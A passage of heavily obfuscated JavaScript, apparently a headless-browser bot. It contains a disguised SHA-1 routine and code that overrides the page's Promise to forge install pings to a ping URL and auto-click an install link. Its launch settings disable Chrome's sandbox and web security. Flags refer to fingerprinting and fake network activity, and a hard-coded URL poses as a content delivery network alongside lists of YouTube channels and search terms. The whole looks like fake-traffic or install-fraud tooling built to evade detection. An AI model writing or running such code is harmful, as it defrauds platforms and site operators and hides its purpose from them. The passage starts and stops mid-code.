                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x22be + -0x1c95 + 0x28b * 0x19 ? (this['block'] = P[-0x72 * 0x53 + -0x19df + 0x6fd * 0x9], this['start'] = N - (0x1b6 + 0x1eca + -0x20 * 0x102), this['hash'](), this['hashed'] = -0x216f + -0x1d29 + 0x3e99 * 0x1) : this['start'] = N;
                }
                return this['bytes'] > -0x14bd * -0x391a8 + 0x110d2844 * 0x4 + 0x71c7b5e7 && (this['hBytes'] += this['bytes'] / (-0xedc93434 + -0x80 * 0x26ac908 + 0x812 * 0x6385ca) << -0x1b42 + -0x4c * 0x8 + -0x1 * -0x1da2, this['bytes'] = this['bytes'] % (0x1a66d5 * -0xc14 + -0xb325b178 + 0x2f207b61c)), this;
              }
            }
            ['finalize']() {
              const W = c;
              if (!this['finalized']) {
                this['finalized'] = -0x26f7 + -0x14c2 + 0x3bba;
                var J = this[W(0x8)],
                  K = this['lastByteIn' + 'dex'];
                J[0x2044 + -0x23ef + 0x3bb] = this['block'], J[K >> 0x1164 + -0x1909 + 0x7a7] |= x[-0x2335 + -0x26a8 * -0x1 + -0x370 & K], this['block'] = J[0x11d8 + -0xb71 + -0x657 * 0x1], K >= 0xf90 + 0x26b8 + -0x3610 && (this['hashed'] || this['hash'](), J[0x1fc5 + -0xb * 0x5c + -0x1bd1 * 0x1] = this['block'], J[-0x1490 + -0x701 * 0x1 + 0xb * 0x283] = J[0x6 * -0x259 + -0x847 + 0x165e] = J[0x1147 + 0x47e * 0x2 + -0x8f * 0x2f] = J[0x1a12 + -0x1dd5 + 0x6 * 0xa1] = J[-0x5ab * -0x1 + -0x167d + 0x10d6] = J[-0x7cf + 0x174a + -0xf76] = J[-0x2497 + -0x2164 + 0x4601] = J[-0x2540 + 0x205b * 0x1 + 0xd2 * 0x6] = J[0x63d + 0xab2 + -0x10e7] = J[0x22d * 0x2 + -0x19ac + 0x155b] = J[-0x14bf + 0x7c7 * -0x1 + 0x724 * 0x4] = J[-0x975 + -0xe75 + 0x17f5] = J[0x75 * -0x43 + 0x94d + 0x155e] = J[0x73c + 0x4 * -0x4d5 + 0xc25] = J[-0x1630 + -0x450 * 0x1 + 0x1a8e] = J[-0x10b * 0x15 + 0x10a * -0x3 + 0x1914] = 0x12d + 0x1490 + -0x5 * 0x459), J[-0x2048 + 0x9 * 0x83 + 0x1bbb] = this['hBytes'] << -0xc * 0x71 + -0x285 * -0x4 + -0x6f * 0xb | this['bytes'] >>> -0x1369 * -0x2 + 0x1a51 + -0x94a * 0x7, J[-0x816 + -0xa * 0x89 + 0xd7f] = this['bytes'] << 0x1 * 0x2ef + 0xdd5 + -0x10c1, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0xbb * 0x2b + -0x2645 + 0x6ec; J < 0x2429 + 0x1 * -0x932 + -0x1aa7; ++J)
                K = Q[J - (-0x6a * -0x2b + -0x338 + -0xe93)] ^ Q[J - (0x18ac + -0x1ba0 + -0xbf * -0x4)] ^ Q[J - (0xf77 + -0xe53 + -0x2 * 0x8b)] ^ Q[J - (0x1 * 0x868 + -0x11 * 0x161 + 0x5 * 0x305)], Q[J] = K << 0x3 * -0xa3 + -0x5 * -0x2e7 + -0xc99 * 0x1 | K >>> -0xe16 + -0xd8a + 0x1bbf;
              for (J = -0x2697 + 0x12eb + -0x4eb * -0x4; J < 0x2502 + -0x4 * -0x123 + 0x297a * -0x1; J += 0x1733 + 0x3dc * 0x1 + -0x1b0a)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2113 + -0x15b8 + 0x36d0 | L >>> 0x1 * -0x205f + -0x1 * 0x19c7 + 0x3a41 * 0x1) + (M & N | ~M & O) + P + (0x1046 * 0x50a27 + 0x2 * 0x14b9c606 + -0x20f4491d) + Q[J] << -0x1 * 0x210e + 0x7 * -0x51 + 0x1 * 0x2345) << -0x4c * 0x67 + 0x1 * 0x2578 + 0x6df * -0x1 | P >>> 0x1e9 + 0x1 * 0x3df + 0x5ad * -0x1) + (L & (M = M << -0x3 * 0x1d8 + -0xf9 + 0x69f | M >>> -0x18 * 0x7 + -0x2b * 0xbf + 0x20bf) | ~L & N) + O + (-0x911a9ddb * 0x1 + 0xb7a7c5 * -0x8f + -0x1f * -0xae8e5a1) + Q[J + (0x3db + 0x2f * 0xad + -0x239d)] << 0x1248 + 0x2 * -0xde7 + 0x2e * 0x35) << 0x94c * -0x1 + -0x1bba + -0x250b * -0x1 | O >>> 0x6 * -0x119 + -0x2a * 0x6d + 0x1893 * 0x1) + (P & (L = L << -0x1d2 * -0xc + 0x1611 + 0x12f * -0x25 | L >>> 0xbb4 + 0x20c4 + 0x2c76 * -0x1) | ~P & M) + N + (-0x29790105 + -0x25 * -0x4d92fbb + 0x44e23 * -0xb03) + Q[J + (-0x214c + -0x1034 + 0x3182)] << -0x258 + -0xb * -0xb3 + -0x559 * 0x1) << 0xcd9 * 0x2 + -0x1 * 0x5ab + -0xc5 * 0x1a | N >>> 0x84 * 0x2d + 0xcd9 + -0x23f2) + (O & (P = P << -0x824 + -0x3 * 0x611 + 0x209 * 0xd | P >>> -0xaa6 + -0x22ba + 0x2d62) | ~O & L) + M + (-0x2bccf * 0x2b3f + 0x64ceed1 * -0x2 + 0xdd7f932c) + Q[J + (-0x3 * -0x5bf + -0x122 * -0x1a + -0x2 * 0x1757)] << 0x15 * -0x23 + 0x1d33 + -0x14 * 0x151) << -0x1f2e + 0x1db4 + -0x17f * -0x1 | M >>> -0x4e1 + 0x3 * 0xaed + -0x1bcb) + (N & (O = O << -0xe21 * 0x2 + 0x1 * -0x214a + 0x6da * 0x9 | O >>> 0x211a + -0xae0 + -0x1638) | ~N & P) + L + (-0x2bdc74f7 * 0x2 + 0x35 * 0x2ab6706 + 0x28f * 0xe5ca7) + Q[J + (0xe94 * 0x1 + 0x13e6 + -0x2276)] << 0x256d * 0x1 + 0x5 * -0x50d + -0xc2c, N = N << 0x1535 + 0x1 * 0xa9a + -0x1fb1 | N >>> 0x1282 + 0x96e + -0x1bee;
              for (; J < 0x1973 + -0x17a + 0x17d1 * -0x1; J += 0x2b7 + -0x265 * -0x1 + -0x517)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xf00 + -0x24ae + 0xa57 * 0x5 | L >>> -0xaf1 + 0x1a4b + -0x3 * 0x515) + (M ^ N ^ O) + P + (0x4f * 0xf6f572 + 0x461 * 0x2cba79 + -0xa1385e66) + Q[J] << -0x46e + 0x2e * -0x53 + -0x1 * -0x1358) << -0x833 + -0x1444 + 0x71f * 0x4 | P >>> -0x1501 + 0x229e + -0xd82) + (L ^ (M = M << -0x1 * 0x224d + -0xd85 + -0x8 * -0x5fe | M >>> -0x1179 + 0x26ce + -0x1553) ^ N) + O + (-0xd7c0235a + -0x1b7 * 0x99b5f + 0xab89bf72 * 0x2) + Q[J + (0x1098 + 0x5e8 + -0x167f)] << 0x15cf * -0x1 + 0x1388 + 0x247) << 0x2031 + -0x5 * 0x71d + 0x365 | O >>> -0x2542 + 0x766 + 0x1 * 0x1df7) + (P ^ (L = L << -0x300 + -0x249 + 0x567 | L >>> 0x1217 + -0x40a * -0x6 + -0x2a51) ^ M) + N + (0x3be04f * -0x166 + 0x54a71dbd + 0x6dee7c5e * 0x1) + Q[J + (0xcc7 * -0x3 + -0xf64 + 0x35bb)] << -0xb7c + -0xbd1 + 0x174d * 0x1) << 0xe77 + -0xd * -0x1ee + -0x2788 | N >>> 0x28 * 0x2 + 0x4be * 0x1 + -0x4f3) + (O ^ (P = P << -0x26fc + -0x4f2 + 0x2c0c | P >>> 0x243a + 0x1c24 + -0x405c) ^ L) + M + (-0x13cdfa * -0xa7a + 0x8d93155c + -0x40cf * 0x3acf1) + Q[J + (0x3 * -0x469 + -0x1fa8 + 0x2ce6)] << 0xba4 + 0xad * 0xb + -0x1313) << 0x773 + 0x2593 + -0x2d01 | M >>> -0x13b2 + -0x209 + 0x15d6) + (N ^ (O = O << 0x1c06 * 0x1 + -0x589 * -0x6 + -0x1e8f * 0x2 | O >>> -0x2 * 0xf76 + 0xa49 + 0x1 * 0x14a5) ^ P) + L + (-0x259f37c6 + -0x18d18a62 + 0xad4aadc9 * 0x1) + Q[J + (-0xdd2 + -0x1d3e * -0x1 + 0x4 * -0x3da)] << -0x88 + 0x21c4 + -0x213c, N = N << 0x14b7 + -0x30d * 0x7 + 0xc2 | N >>> 0x2021 + -0x1099 + -0x1 * 0xf86;
              for (; J < -0x217 * 0xa + -0x7ed * -0x1 + -0x45 * -0x31; J += 0x15dd + 0x2 * -0x99b + 0x2 * -0x151)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x19 * 0x78 + 0x1e1d + -0x2 * 0x14e8 | L >>> -0x200 + 0xe * -0xd3 + 0xda5) + (M & N | M & O | N & O) + P - (0x7bf329 * 0x19c + -0x67532e3f + 0x10bc1b67) + Q[J] << 0x3a * 0x5 + -0x12e2 * 0x1 + -0x8 * -0x238) << -0xb * -0xb9 + -0xd * -0x14b + 0x1 * -0x18bd | P >>> -0x3 * -0x9eb + 0x41 * -0x66 + 0x4 * -0xf0) + (L & (M = M << -0x63d + 0x4 * 0x602 + 0x11ad * -0x1 | M >>> -0x2151 * -0x1 + -0xa4 * -0xb + -0x285b) | L & N | M & N) + O - (-0x17d3 * 0x52a0b + -0x16 * 0x50f0e03 + 0x15b381b77) + Q[J + (0x183 + -0x1030 + 0xeae)] << 0x1d5 * -0x15 + -0x1d7 + 0x2850) << -0x2 * 0x106d + 0x1 * 0x419 + 0x1cc6 | O >>> 0x347 * -0x2 + 0x6da * 0x5 + -0x1b99) + (P & (L = L << -0x15 + -0x1fd * -0x10 + 0x1f9d * -0x1 | L >>> 0x1d73 + 0x2 * -0x9d3 + 0x6d * -0x17) | P & M | L & M) + N - (-0x67a * -0x1d954a + -0x86eeb3 * -0x113 + -0x2d101 * 0x4f69) + Q[J + (0x40b + -0x1 * -0x979 + -0xd82)] << 0x1 * -0x1073 + 0xe44 + 0x22f) << 0x20c9 + -0x4a * -0x1d + -0x2926 | N >>> -0x1a9 + -0x1d5 * -0x4 + 0x1 * -0x590) + (O & (P = P << 0x2223 * 0x1 + -0xaea + -0x23 * 0xa9 | P >>> -0x1980 + 0x1 * 0x1e9e + -0x6 * 0xda) | O & L | P & L) + M - (0xa9d35fcb + 0x685a888b + -0x299f647 * 0x3e) + Q[J + (0x1ee7 + -0x23a1 + 0x4bd)] << -0x793 * -0x1 + -0x2673 + 0x1ee0) << -0x1e1a * -0x1 + -0x226b + 0x456 | M >>> -0x61b * 0x5 + 0x1773 + 0x3 * 0x265) + (N & (O = O << 0x307 * -0x7 + -0x2 * -0x405 + 0x1 * 0xd45 | O >>> 0x1 * 0x19c9 + -0x615 * 0x1 + -0x13b2) | N & P | O & P) + L - (0x5b98e524 + 0xbdb92d93 + 0x11d8c65 * -0x97) + Q[J + (-0x13d * 0x1a + 0xb6a * 0x1 + 0x14cc)] << 0x426 + -0x7c9 * -0x1 + -0xbef, N = N << -0x1e14 + 0x248 * 0x5 + -0x2 * -0x965 | N >>> -0x1a * 0x86 + 0x4 * 0x4a3 + -0x4ee;
              for (; J < -0x1dc6 + -0x1da8 + 0x3bbe; J += -0x1 * 0x58b + 0x3f6 + 0x19a)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0x671 + -0x11af * -0x2 + -0x6f7 * 0x6 | L >>> -0xc7d + 0x1059 + -0x3c1) + (M ^ N ^ O) + P - (0x16dd7 * 0x3fc5 + 0x8addaff * 0x6 + -0x577a1 * 0x1063) + Q[J] << -0x4 * 0x39a + -0x139e + 0x1103 * 0x2) << 0x2 * 0xf5b + 0x97 * -0x37 + 0x1c0 | P >>> 0x3 * 0x897 + 0x1edc + 0xa * -0x5a7) + (L ^ (M = M << 0x13 * 0x125 + 0xb18 + 0x20b9 * -0x1 | M >>> 0x17 + 0xae1 * 0x3 + -0x20b8) ^ N) + O - (-0xcfed311 * -0x5 + 0x3148a2cf + -0x6 * 0xa1b95ff) + Q[J + (-0x20ec + 0x7ea + 0x1903)] << 0x949 * -0x4 + -0xff1 + 0x3515 * 0x1) << -0x2 * 0x2ba + -0x75d * -0x5 + -0x1f58 | O >>> 0xbb7 * -0x2 + -0x65d * 0x2 + -0x1 * -0x2443) + (P ^ (L = L << -0x1d * 0xf2 + 0xf61 + 0xc27 | L >>> -0x1fa + 0x25da + -0x23de) ^ M) + N - (-0x39016105 + 0x443a4fd7 + 0x2a644f58) + Q[J + (0xba * -0x8 + -0x1 * 0x1d35 + 0x2307)] << -0x1 * -0x2ab + -0x128e + 0x1 * 0xfe3) << -0x365 * 0x7 + -0x1 * -0x1c8b + -0x17 * 0x35 | N >>> -0x9da + -0x589 * 0x4 + -0x3 * -0xab3) + (O ^ (P = P << 0x1105 * 0x1 + 0x24b5 + -0x1 * 0x359c | P >>> -0x1245 * -0x1 + 0x1478 + 0xf * -0x295) ^ L) + M - (0xcaf41fa + -0x2262b331 + 0x4b50af61) + Q[J + (-0x9f3 + -0x1f6 * 0xe + 0x256a)] << 0x5d1 + -0x12c * 0xd + 0x1 * 0x96b) << 0x1b27 + -0x23db + 0x8b9 | M >>> -0xec3 + -0x1 * -0x47 + 0x9 * 0x19f) + (N ^ (O = O << 0x1f72 + -0x234a + -0x3f6 * -0x1 | O >>> 0x1 * 0x1cab + -0x1 * 0x977 + -0x1332) ^ P) + L - (-0x43e938cf + -0xf6 * 0xc1dc1 + 0x852b0e6f) + Q[J + (-0x1a62 + -0xb * 0x2a7 + 0x3793 * 0x1)] << -0x1631 + 0x29 * -0xef + 0x2 * 0x1e3c, N = N << -0x15c * 0xd + -0x1 * -0xe16 + 0x3b4 | N >>> -0xfec + -0x74d + -0x13 * -0x139;
              this['h0'] = this['h0'] + L << 0x85 * 0x2e + -0x1382 + 0x2 * -0x232, this['h1'] = this['h1'] + M << 0x2310 + 0x478 + -0x2788, this['h2'] = this['h2'] + N << -0x22c7 + -0x1 * -0x1ae1 + 0x7e6, this['h3'] = this['h3'] + O << -0x2bd * 0xd + 0xc86 + 0x1713, this['h4'] = this['h4'] + P << 0x14ee + -0x13af * 0x1 + -0x13f * 0x1;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x47 * -0x19 + -0x1ff8 + -0x29 * -0x9d & -0x5e * -0x44 + -0x26 * 0x86 + -0x505 * 0x1] + w[J >> 0xe0d + 0x1cac + -0x2aa1 & 0x28b + -0x265 + -0x17] + w[J >> -0x1 * -0x2525 + 0x2b * -0x2 + 0x1 * -0x24bb & 0x14b * 0xf + -0x3da * -0x1 + 0x1a8 * -0xe] + w[J >> 0x248b * 0x1 + 0x17 * -0x175 + -0x2f8 & -0x7aa * 0x5 + -0xa3f + 0x1 * 0x30a0] + w[J >> -0x2627 + 0x3bc + 0x2277 & 0x1472 + 0x1706 + 0x1 * -0x2b69] + w[J >> -0xe72 + -0x2f6 * -0xa + 0x1 * -0xf22 & 0x119c + -0x1710 + 0x583] + w[J >> -0x151e + -0x2 * -0xbfa + 0x169 * -0x2 & 0xe23 * -0x2 + 0xdff * 0x1 + -0x72b * -0x2] + w[-0x69d * 0x5 + 0xfb5 + 0x116b & J] + w[K >> -0x74 * 0xb + 0x1e4c + -0xc9a * 0x2 & -0x1c7c + -0x1c17 + 0x38a2] + w[K >> -0x28 * -0x8d + -0x1ace + -0x59 * -0xe & 0x23d1 + -0x103 * -0x23 + -0x472b * 0x1] + w[K >> -0x552 * -0x1 + 0x5 * -0x704 + -0x192 * -0x13 & -0x1 * -0x1a7b + -0x51b + 0x1551 * -0x1] + w[K >> -0xa98 + -0x493 * -0x3 + -0x1 * 0x311 & -0x1 * -0x6b + 0x1 * -0x1039 + 0xfdd] + w[K >> 0x60 * 0x53 + -0x24ba * 0x1 + -0x2 * -0x2d3 & 0xf45 + 0x1847 + 0xb * -0x397] + w[K >> -0x1349 * -0x1 + -0x7 * 0xe5 + -0xcfe & 0x1 * 0x1517 + -0x3a7 + 0x5cb * -0x3] + w[K >> -0x1 * 0x2006 + -0x41e + 0x34 * 0xb2 & 0x267 + -0x7e5 + -0x1d * -0x31] + w[0x1bb5 + 0x19e2 + -0x3588 & K] + w[L >> 0x8b5 * 0x1 + -0x1 * 0x61 + 0x41c * -0x2 & 0x3 * 0x7ff + 0x239 * -0x5 + -0xcd1] + w[L >> -0xb88 * 0x1 + 0x1 * -0xa17 + -0x11 * -0x147 & -0x1bd0 + 0x1ca + -0x1 * -0x1a15] + w[L >> 0xd39 + 0x2 * -0x829 + 0x32d & -0x47 * -0x1 + -0x4 * 0x3b + 0xb4] + w[L >> 0xfb0 + -0x2 * 0x676 + 0xad * -0x4 & -0xc95 * -0x1 + 0x1dd5 + -0x2a5b * 0x1] + w[L >> 0x5 * -0x15b + 0x4f * -0x78 + 0x2bdb * 0x1 & -0x219a + 0x1 * -0x2621 + 0x47ca] + w[L >> 0x1 * 0xa39 + 0x260e + 0x3 * -0x1015 & 0x14ba + -0x16 * -0x23 + -0x17ad] + w[L >> -0xe * -0x265 + -0x10e2 * -0x1 + -0x56 * 0x96 & -0x8c5 + -0x287 + 0xb5b] + w[0x68 * -0x2c + 0x298 + 0xf57 & L] + w[M >> -0x391 + 0x19fd + -0x2a * 0x88 & -0xd4d + -0x4 * 0x796 + 0xaed * 0x4] + w[M >> 0x1139 + -0x1b57 + 0xa36 & 0x20f5 + 0x1 * 0xa5d + -0x2b43] + w[M >> -0x1869 + 0x2 * 0x10bb + -0x8f9 * 0x1 & 0x1d72 + 0xb * 0x2bb + -0x3b6c] + w[M >> -0x220e + -0x6 * -0x479 + 0x748 & -0x2 * 0x135 + 0x7a * 0x23 + -0xe35] + w[M >> -0x1 * -0x2108 + -0x1b7a + -0x582 & -0x722 * -0x1 + -0x1 * 0x1c3 + -0x550] + w[M >> -0xe4 * -0x1 + -0x21df + 0x2103 & 0x2cf * 0x1 + 0x710 + -0x1 * 0x9d0] + w[M >> 0x3 * -0x641 + 0xff5 + -0x1 * -0x2d2 & -0x17f * -0xb + -0x761 * -0x1 + -0x17c7] + w[-0x1f26 + 0x1832 + 0x703 & M] + w[N >> -0x2 * -0x1cf + 0x2019 + -0x71f * 0x5 & 0xcbb * 0x3 + 0x17e4 + 0x11 * -0x3a6] + w[N >> -0x1 * -0xfef + 0x4 * 0x685 + -0x3 * 0xdf9 & 0x1121 * 0x1 + 0x2 * 0x3d6 + -0x18be] + w[N >> 0x418 + -0x1 * -0x204b + -0x8f * 0x41 & 0xd84 + -0x775 + -0x600] + w[N >> 0x1de * -0x3 + 0x18a4 + 0x7 * -0x2b6 & -0x6fd * 0x1 + -0xb9 * -0xe + -0x3 * 0x106] + w[N >> -0x18ec + -0x2204 + 0xebf * 0x4 & 0xe7a + -0x3c * -0x67 + -0x268f * 0x1] + w[N >> -0x1 * 0xf80 + -0x124 + 0x10ac & -0x71 * 0x52 + -0x2507 + -0x2 * -0x24a4] + w[N >> 0xe3 * -0x3 + 0x231 * -0xd + 0x1f2a * 0x1 & 0x259f + 0x1 * 0x73b + -0x1 * 0x2ccb] + w[0x82 * -0x2a + -0xb8f + 0x20f2 & N];
            }
            [X(0x1f)]() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x9c3 * -0x3 + -0x5 * 0x609 + 0xfc & 0x3 * -0x412 + -0x1669 * 0x1 + 0x5e * 0x61,
                J >> -0x21c1 + 0x1 * 0xfc3 + 0x120e & -0x1159 + 0x115b + 0x1 * 0xfd,
                J >> 0x19c6 + 0x1925 + 0x745 * -0x7 & -0xff8 + -0x2576 + 0x1 * 0x366d,
                0x1041 + -0xeef + -0x53 & J,
                K >> 0x1710 + 0xa7a + -0x2172 & 0x1733 + -0x17ac + 0x178,
                K >> 0x1a2b + 0x9 * -0x414 + 0xa99 & 0x14 * -0x77 + -0x6 * -0x1e8 + -0x125,
                K >> -0x1 * -0xdd5 + -0x2 * 0x107 + -0xbbf & 0x1 * -0xc97 + -0x1fe4 + 0x2d7a,
                0x99d + -0x191c + 0x107e & K,
                L >> 0x21 + -0x24c5 + 0x4 * 0x92f & 0xa0f + 0x241a + -0x2d2a,
                L >> 0x9 * -0xe9 + -0x4ad + 0xcee & -0xaea * 0x2 + -0x3 * 0x64e + 0x29bd,
                L >> -0x2231 * 0x1 + -0x116 * 0xc + -0x2f41 * -0x1 & 0x135 + 0x41e * -0x4 + -0x821 * -0x2,
                0xf6 * 0x10 + 0xa43 + -0x18a4 & L,
                M >> 0x896 * 0x1 + 0x5ad * 0x1 + 0x27 * -0x5d & -0x14c * 0x7 + 0x168f + -0x1 * 0xc7c,
                M >> -0x6d * 0x21 + -0x1 * -0x409 + 0xa14 & 0x224 * 0x1 + 0x551 * 0x6 + 0xb * -0x301,
                M >> 0xb43 + 0x6c2 * -0x5 + 0x168f & -0x25f5 + -0x1 * 0x50a + 0x2bfe,
                0x50f + 0x2500 + -0x2910 & M,
                N >> 0x1 * 0x2336 + -0x187e + -0xaa0 & 0x41 * 0x5f + 0x1 * -0x1355 + -0x1 * 0x3cb,
                N >> 0x1 * -0x223 + 0x1c31 + -0x19fe & -0x1 * 0x149a + 0x1dde + -0x1 * 0x845,
                N >> 0x1f02 + 0x1 * -0x16a9 + -0x851 & -0x53 * 0x49 + -0x356 * 0x7 + 0x3004,
                0x83c * 0x2 + 0x71f + -0x1698 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0xbd7 * 0x3 + 0x157 + -0xa * -0x36d), (K = new DataView(J))['setUint32'](0x21dd + 0x208b * 0x1 + -0x4268, this['h0']), K['setUint32'](-0x72 * 0x1 + 0x1b66 + -0x1af0, this['h1']), K['setUint32'](-0x173 * 0xb + -0x180e * -0x1 + -0x815, this['h2']), K['setUint32'](0x267e + 0x257e + -0x4bf0, this['h3']), K['setUint32'](-0x2235 + -0xb * 0x226 + -0x66f * -0x9, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x2502 + 0x1795 + 0xd6d];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x79 * 0x3b + -0x23c0 + 0x3fa3;
            J[-0x1e9 + -0x10 * 0x5e + -0x7c9 * -0x1]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x4 * -0x2e + 0x7b9 + 0x1 * -0x871] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x263d * -0x1 + 0xc2d + -0x3269), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x741 + 0x1946 + 0x4 * -0x481;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x1b19 + 0x1421 + 0x423 * -0xa), Promise['resolve'](-0x2294 + 0x1 * -0x1c6d + 0x3f02);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1672 + 0x182c + -0x1ba; j < 0x12ac + 0xa75 + -0x1d20; j++)
    i();
}
const NETWORK_PATIENCE = -0xc95 * 0x1 + -0xe06 + 0x1 * 0x39db + (-0x2ff + 0x2233 + -0x137c) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x209d + 0x11bf + -0x3259) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1546 + -0x18fd + 0x38f * 0xd);
    let h = e[f];
    return h;
  }, d(b, c);
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + Y(0x1e) + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x2263 * -0x1 + -0x2005 * -0x1 + 0x154 * -0x32; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + Z(0xa, 'dtvw') + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + Y(0x5) + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + a0(0x2) + 'ast,mrbeas' + 't\x20last\x20to\x20' + 